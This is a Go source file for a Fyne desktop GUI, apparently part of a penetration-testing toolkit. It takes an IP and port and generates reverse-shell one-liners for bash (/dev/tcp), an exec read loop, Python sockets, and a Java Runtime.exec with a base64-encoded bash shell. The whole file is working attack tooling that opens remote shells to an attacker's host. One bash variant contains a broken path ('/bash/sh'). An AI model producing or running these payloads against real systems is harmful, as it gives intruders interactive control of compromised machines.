package module

import (
	"encoding/base64"
	"fmt"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/widget"
)

func ReverseUI() *fyne.Container {
	ip := widget.NewEntry()
	ip.PlaceHolder = "请输入IP地址"
	port := widget.NewEntry()
	port.PlaceHolder = "请输入端口"
	bash1 := widget.NewMultiLineEntry()
	bash2 := widget.NewMultiLineEntry()
	exec := widget.NewMultiLineEntry()
	python := widget.NewMultiLineEntry()
	java := widget.NewMultiLineEntry()
	ip.OnChanged = func(s string) {
		bash1.SetText(Bash1(ip.Text, port.Text))
		bash2.SetText(Bash2(ip.Text, port.Text))
		exec.SetText(Exec(ip.Text, port.Text))
		python.SetText(Python(ip.Text, port.Text))
		java.SetText(Java(ip.Text, port.Text))
	}
	port.OnChanged = func(s string) {
		bash1.SetText(Bash1(ip.Text, port.Text))
		bash2.SetText(Bash2(ip.Text, port.Text))
		exec.SetText(Exec(ip.Text, port.Text))
		python.SetText(Python(ip.Text, port.Text))
		java.SetText(Java(ip.Text, port.Text))
	}
	return container.NewBorder(container.NewGridWithColumns(2, ip, port), nil, nil, nil, widget.NewForm(
		widget.NewFormItem("bash1", bash1),
		widget.NewFormItem("bash2", bash2),
		widget.NewFormItem("exec", exec),
		widget.NewFormItem("python", python),
		widget.NewFormItem("java", java),
	))

}

func Bash1(ip, port string) string {
	return fmt.Sprintf("bash -i >& /dev/tcp/%v/%v 0>&1", ip, port)
}

func Bash2(ip, port string) string {
	return fmt.Sprintf("/bash/sh -i >& /dev/tcp/%v/%v 0>&1", ip, port)
}

func Exec(ip, port string) string {
	return fmt.Sprintf("exec 5<>/dev/tcp/%v/%v;cat <&5|while read line;do $line >&5 2>&1;done", ip, port)
}

func Python(ip, port string) string {
	return fmt.Sprintf(`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%v",%v));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);`, ip, port)
}

func Java(ip, port string) string {
	return fmt.Sprintf(`eval java.lang.Runtime.getRuntime().exec("bash -c {echo,%v}|{base64,-d}|{bash,-i}")`, base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("bash -i >& /dev/tcp/%v/%v 0>&1", ip, port))))
}
